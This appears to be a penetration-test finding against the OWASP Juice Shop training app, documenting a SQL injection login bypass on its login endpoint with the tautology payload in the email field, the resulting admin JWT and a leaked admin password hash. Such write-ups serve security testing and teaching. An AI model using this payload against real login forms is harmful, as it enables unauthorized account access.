## SQL Injection-Based Authentication Bypass

**Vulnerability Class:** SQL Injection leading to Authentication Bypass
**Endpoint:** POST /rest/user/login
**Vulnerable Parameter:** email
**Detection Payload:** `' OR '1'='1' -- `
**Evidence:**
- Request: POST /rest/user/login with email=`' OR '1'='1' -- ` and password=`anything`
- Response: HTTP 200 OK with JSON containing JWT authentication token
- The response includes a valid JWT token with admin user data:
  - User id: 1
  - Email: admin@juice-sh.op
  - Role: admin
  - Password hash: 0192023a7bbd73250516f069df18b500
  - isActive: true

**JWT Token Structure:**
- Header: `{"typ":"JWT","alg":"RS256"}`
- The token is signed with RS256 (RSA with SHA-256), not "none"
- Contains user data including password hash in the payload

**Impact:** Complete authentication bypass - any user can authenticate as admin without knowing credentials. The SQLi in the email field allows injecting a tautology that returns the first user record (admin).